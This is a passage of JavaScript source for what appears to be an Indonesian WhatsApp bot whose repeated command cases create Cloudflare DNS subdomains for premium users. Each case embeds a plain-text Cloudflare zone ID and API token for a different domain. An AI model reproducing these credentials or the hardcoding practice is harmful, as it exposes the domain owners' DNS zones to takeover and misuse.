                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d38': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "4694151772044ecbde79bf10b8dca730";
            let apitoken = "eW13F3O29vjOVypirIaGBmU-LwAsZMPAtR8-0x8-"
            let tld = "rhizhosting.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d39': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "116e3ba4e2ce41388c85195453d272ff";
            let apitoken = "VaiGZW4VPPkfwZPqD2Ztp3FMZPT9vBjFmRu_EDyN"
            let tld = "spasanddella.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d40': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "dfcb1630d4c47925ec76705d441857aa";
            let apitoken = "Cqpz3ztJyLgUbkTyKz_LSIxEuRyXRkc3E3m5ISdA"
            let tld = "zerowant.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d41': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "946d5f35d0657cb8bfa442675b37ec42";
            let apitoken = "9IJl3ihBj_McQT6aG0D5MBFQH3YmB1PO7Z34XLr1"
            let tld = "sellerpanel-vvip.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d42': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "fbbab29b950786dc9ca7917747f9b017";
            let apitoken = "zhtsEm27FKPsczF3ro2PipM9i1n8k2rzCyOmvj"
            let tld = "ekiofficial.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d43': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "4a4818365a74cf535d5b6f16dc62481d";
            let apitoken = "8-zhtsEm27FKPsczF3ro2PipM9i1n8k2rzCyOmvj"
            let tld = "ekioffcial.biz.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d44': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "d77df730ad2421691e48392be2212425";
            let apitoken = "fhsmn3_iQzBCOfMxjzOyWbG3VLbrFJBW9qAP4hQy"
            let tld = "nw-terbaru-whs.biz.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d45': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "725378afbddffcc9e2c2992ba4232421";
            let apitoken = "MAe0GRPPRxS77oPYXTvImAKNTWit55R63AxuNT1B"
            let tld = "panelku-jasteb.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d46': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "d24389703fb6a0e39980ff480b750bfb";
            let apitoken = "ygaK3KYUw9nzXTX4GTVrry7Do0EcNZ5pau-PcFNC"
            let tld = "tokodigitalonline.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d47': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "705b7ba658c5f033b91b1b7985f53244";
            let apitoken = "Ucf7fYmbCbDuNDGJ1J3KE8noSS3tgNHRQMxCJZk8"
            let tld = "pannel-pvrt.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d48': {
